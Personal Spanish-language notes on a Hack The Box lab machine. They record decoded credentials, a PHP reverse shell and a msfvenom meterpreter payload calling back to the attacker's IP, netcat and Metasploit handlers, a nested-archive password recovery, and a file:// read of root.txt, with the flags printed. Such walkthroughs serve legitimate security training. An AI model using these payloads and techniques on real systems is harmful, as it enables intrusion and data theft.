@@ -1,0 +1,146 @@
+10.10.10.150/secret.txt
+
+en base64
+Curling2018!
+
+usr: Floris
+psw: Curling2018!
+
+en 10.10.10.150/administrator
+mismo usr y psw
+
+buscar e instalar Simple file upload 1.4
+https://wasen.net/index.php/projects/simple-file-upload
+
+cambiar configuracion para permitir php y publicar
+
+cambiar ip y puerto en reverse_shell.php
+upload en la pagina el shell ir a la pag.
+
+
+en kali abrir terminal ejecutar
+nc -lvp 1234
+tengo shell
+
+subir a terminal
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py  
+NO ANDA NO HAY PYTHON
+
+OTRO SHELL CON METERPRETER
+
+pruebo con un meterpreter
+msf> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.244 LPORT=4544 -f raw > Ushell.php
+lo subo y abro un multi/handler en msf de kali antes de ejecutar
+
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 10.10.15.244
+lhost => 10.10.15.244
+msf exploit(multi/handler) > set lport 4544
+lport => 4544
+msf exploit(multi/handler) > exploit
+
+tengo meterpreter
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ESTE SI ANDA
+
+User! La verdadera forma de hacerlo.
+
+En el dir /home/floris existe un archivo password_backup que tiene un hexdump adentro rarisimo
+En el foro sobre la maquina decia de guglear bandit 12 y en otro posteo de que si los primeros datos
+parecen familiares hay que guglear. Entonces encontre esto:
+
+http://hexjump.blogspot.com/2014/12/bandit-level-12-to-level-13.html
+
+Los pasos que segui para llegar al passwd:
+
+koli@kali:~/Desktop/HTB/150$ file pwd_backup    (comando file te dice que es)
+pwd_backup: ASCII text
+koli@kali:~/Desktop/HTB/150$ xxd -r pwd_backup binary  (pasa de hexdump a archivo)
+koli@kali:~/Desktop/HTB/150$ file binary
+binary: bzip2 compressed data, block size = 900k
+koli@kali:~/Desktop/HTB/150$ mv binary binary.bz2  (cambio el nombre nomas)
+koli@kali:~/Desktop/HTB/150$ bzip2 -d binary.bz2  (descomprimo con bz2)
+koli@kali:~/Desktop/HTB/150$ file binary
+binary: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
+koli@kali:~/Desktop/HTB/150$ mv binary binary.gz  (cambio nombre)
+koli@kali:~/Desktop/HTB/150$ gzip -d binary.gz (descomprimo con gzip)
+koli@kali:~/Desktop/HTB/150$ file binary
+binary: bzip2 compressed data, block size = 900k
+koli@kali:~/Desktop/HTB/150$ mv binary binary.bz2
+koli@kali:~/Desktop/HTB/150$ bzip2 -d binary.bz2
+koli@kali:~/Desktop/HTB/150$ file binary
+binary: POSIX tar archive (GNU)
+koli@kali:~/Desktop/HTB/150$ tar -xvf binary  (un archivo tar binario con esos parametros descomprime)
+password.txt
+koli@kali:~/Desktop/HTB/150$ cat password.txt
+5d<wdCbdZu)|hChXll         <--------- PASSWORD DE FLORIS TENGO USER
+
+
+floris@curling:~$ cat user.txt
+65dd1df0713b40d88ead98cf11b8530b
+
+
+floris@curling:~$ ls -la
+ls -la
+total 56
+drwxr-xr-x 7 floris floris 4096 Dec 13 18:45 .
+drwxr-xr-x 3 root   root   4096 May 22  2018 ..
+drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
+lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
+-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
+drwx------ 2 floris floris 4096 May 22  2018 .cache
+drwx------ 3 floris floris 4096 May 22  2018 .gnupg
+drwxrwxr-x 3 floris floris 4096 May 22  2018 .local
+-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
+-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
+-rw------- 1 floris floris   23 Dec 13 17:40 .python_history
+-rw-rw-r-- 1 floris floris    0 Dec 13 18:45 selam.txt
+drwx------ 2 floris floris 4096 Dec 13 18:34 .ssh
+-rw-r----- 1 floris floris    0 Dec 13 18:41 user.txt
+-rw------- 1 floris floris 8052 Dec 13 18:21 .viminfo
+floris@curling:~$ cd admin-area
+cd admin-area
+floris@curling:~/admin-area$ ls -la
+ls -la
+total 48
+drwxr-x--- 2 root   floris  4096 May 22  2018 .
+drwxr-xr-x 7 floris floris  4096 Dec 13 18:45 ..
+-rw-rw---- 1 root   floris    53 Dec 13 18:53 input
+-rw-rw---- 1 root   floris 33786 Dec 13 18:53 report
+
+
+floris@curling:~/admin-area$ cat input
+cat input
+url = "http://127.0.0.1/home/floris/backup_password"
+floris@curling:~/admin-area$ 
+
+
+floris@curling:~$ file .bash_history   
+.bash_history: symbolic link to /dev/null   (es un link que me parece que hace que se borre todo lo que hago)
+floris@curling:~$ rm .bash_history 
+
+
+floris@curling:~$ cd admin-area/
+floris@curling:~/admin-area$ cat input
+url = "file://127.0.0.1/root/root.txt"
+floris@curling:~/admin-area$ cat report
+82c198ab6fc5365fdc6da2ee5c26064a     <---------ROOT.TXT PERO NO ROOT PASSWORD
+
+
+
+comandos nuevos
+htop (procesos)
+pstree
+curl
+
+
+
+82c198ab6fc5365fdc6da2ee5c26064a
+
